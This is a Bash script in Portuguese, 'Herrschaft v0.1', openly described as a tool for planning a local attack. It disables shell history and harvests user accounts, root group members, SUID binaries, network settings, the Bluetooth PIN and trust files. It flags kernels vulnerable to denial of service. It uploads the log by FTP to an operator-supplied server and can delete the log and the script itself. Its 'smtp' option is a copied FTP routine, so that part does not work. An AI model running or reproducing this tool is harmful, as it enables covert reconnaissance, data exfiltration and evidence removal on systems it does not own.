#!/bin/bash
# Herrschaft v0.1 --------> Busca por informacoes importantes do sistema para 
#                           planejar um ataque local, gera um log e permite 
#                           enviar por ftp ou smtp.
#
# Futuras Implementacoes -> - Encriptar Arquivo de Log
#                           - Melhorar funcao e banco de assinaturas para busca de falhas
#                           - Criar shellcode para os comandos, visando passar por IDS
#                           - Melhorar funcao de remover arquivos
#
# coded by Inferninho 
# http://infernozcorp.blogspot.com -- inferninh0@yahoo.com.br
###

unset HISTFILE 
LOG=$(uname -n) 

###Funcao responsavel por enviar log via ftp
######
send_ftp(){
        echo
	echo -e "\e[0;31mDigite o endereco do servidor de ftp:\e[m"
	read HOST 
	echo -e "\e[0;31mDigite o nome do usuario:\e[m"
	read USER
	echo -e "\e[0;31mDigite o passwd:\e[m"
	read PASSWD
	FILE="$LOG.log"
	echo -e "\e[0;31mEnviando Informacoes do Sistema por ftp...\e[m" 
	ftp -n $HOST <<END
	quote user $USER
	quote pass $PASSWD
	put $FILE
	quit
END
}

###Funcao responsavel por enviar log via smtp
######
send_smtp(){
        echo
	echo -e "\e[0;31mDigite o endereco do servidor de ftp:\e[m"
	read HOST 
	echo -e "\e[0;31mDigite o nome do usuario:\e[m"
	read USER
	echo -e "\e[0;31mDigite o passwd:\e[m"
	read PASSWD
	FILE="$LOG.log"
	echo -e "\e[0;31mEnviando Informacoes do Sistema por ftp...\e[m" 
	ftp -n $HOST <<END
	quote user $USER
	quote pass $PASSWD
	put $FILE
	quit
END
}

finaliza(){
        echo
        echo -e "\e[0;31mConcluido...=]\e[m"
        exit 
}

delete(){
        echo
        echo -e "\e[0;31mRemover arquivos? [s/n]\e[m"
        read RESPOSTA

        if [ "$RESPOSTA" = s ]
        then
        echo -e "\e[0;31mRemovendo arquivos...\e[m"
        rm $LOG.log
        rm $0 
        fi

        if [ "$RESPOSTA" = n ]
        then
        finaliza
        fi
}

###Funcao que busca informacoes do sistema e cria o arquivo de log
######
find_info(){
        echo "Log Gerado por Herrschaft" >$LOG.log 
        echo "~~~~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        cat /etc/HOSTNAME >>$LOG.log 2>/dev/null
        date >>$LOG.log 2>/dev/null
        uptime >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Diretorio Atual:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        pwd >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Id do Usuario:" >>$LOG.log
        echo "~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        id >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Versao do Kernel:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        uname -a >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Ultimos Usuarios a logarem:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        last >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Usuarios logados:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        w >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Todos Usuarios do Sistema:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        echo "User   UID     GID      NOME      SHELL" >>$LOG.log
        echo "---------------------------------------" >>$LOG.log
        cat /etc/passwd | cut -d : -f 1,3,4,5,7 | tr : '\t' >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Usuarios do grupo root:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        cat /etc/group | grep root:: >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Programas Rodando:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        ps -aux >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Programas Suid:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        find /bin -user root -perm +a=s >>$LOG.log 2>/dev/null
        find /sbin -user root -perm +a=s >>$LOG.log 2>/dev/null
        find /usr/bin -user root -perm +a=s >>$LOG.log 2>/dev/null
        find /etc -user root -perm +a=s >>$LOG.log 2>/dev/null
        find /var -user root -perm +a=s >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Conexoes:" >>$LOG.log
        echo "~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        netstat -na >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Route:" >>$LOG.log
        echo "~~~~~~" >>$LOG.log
        echo >>$LOG.log
        /sbin/route >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Configuracoes de Rede:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        /sbin/ifconfig >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Redes Wireless:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        /sbin/iwconfig >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "PIN Bluetooth:" >>$LOG.log
        echo "~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        cat /etc/bluetooth/pin >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Arquivo /etc/hosts:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        cat /etc/hosts >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Arquivo /etc/hosts.allow:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        cat /etc/hosts.allow >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Arquivo /etc/hosts.equiv:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        cat /etc/hosts.equiv >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Informacoes do Processador:" >>$LOG.log
        echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        cat /proc/cpuinfo >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Memoria Livre:" >>$LOG.log
        echo "~~~~~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        free >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
        echo "Particoes:" >>$LOG.log
        echo "~~~~~~~~~~" >>$LOG.log
        echo >>$LOG.log
        df -h >>$LOG.log 2>/dev/null
        echo >>$LOG.log
        echo >>$LOG.log
}

###Funcao que busca por falhas no sistema (Fazer funcao em arquivo separado
###e melhorar banco de falhas) 
#######
find_bug(){
echo "Falhas encontradas :" >>$LOG.log
echo "~~~~~~~~~~~~~~~~~~~" >>$LOG.log
echo >>$LOG.log
KERNEL=$(uname -r)
if [ "$KERNEL" = 2.4.22 ] 
then 
        echo "Kernel $KERNEL:" >>$LOG.log 
	echo >>$LOG.log
	echo "Vulneravel a Denial of Service...>;-)" >>$LOG.log
	echo "maiores informacoes em:" >>$LOG.log
	echo "http://www.k-otik.com/exploits/20041216.Guninski.php" >>$LOG.log
fi
if [ "$KERNEL" = 2.4.26 ] 
then 
        echo "Kernel $KERNEL:" >>$LOG.log
	echo >>$LOG.log
	echo "Vulneravel a Denial of Service...>;-)" >>$LOG.log
	echo "maiores informacoes em:" >>$LOG.log
	echo "http://www.k-otik.com/exploits/20041216.Guninski.php" >>$LOG.log
fi
if [ "$KERNEL" = 2.6.9 ] 
then 
        echo "Kernel $KERNEL:" >>$LOG.log 
	echo >>$LOG.log
	echo "Vulneravel a Denial of Service...>;-)" >>$LOG.log
	echo "maiores informacoes em:" >>$LOG.log
	echo "http://www.k-otik.com/exploits/20041216.Guninski.php" >>$LOG.log
fi
}

###MENU
######
menu(){
echo
echo -e "\e[1;31m _   _\e[m" 
echo -e "\e[1;31m| |_| |\e[m" 
echo -e "\e[1;31m|  _  |\e[m"
echo -e "\e[1;31m|_| |_|errschaft v0.1\e[m"
echo
echo -e "\e[0;31mGravando Informacoes do sistema...\e[m"
find_info
echo
find_bug
echo -e "\e[0;31mBuscando por Falhas...\e[m"
echo
echo -e "\e[0;31mEscolha uma das opcoes...\e[m"
echo
echo -e "\e[0;35m   1 - Enviar log via ftp\e[m"
echo -e "\e[0;35m   2 - Enviar log via smtp\e[m"
echo -e "\e[0;35m   3 - Nao enviar e manter log\e[m"

read OPCAO_LOG
case $OPCAO_LOG in
        1)
        send_ftp
        delete
	;;
	2)
        send_smtp
        delete   
	;;
	3)
	finaliza
	;;
	*)
	echo -e "\e[0;31mEscolha uma opcao valida, 1, 2 ou 3...\e[m"
        exit 
	;;
esac
finaliza
}

menu #inicia o script
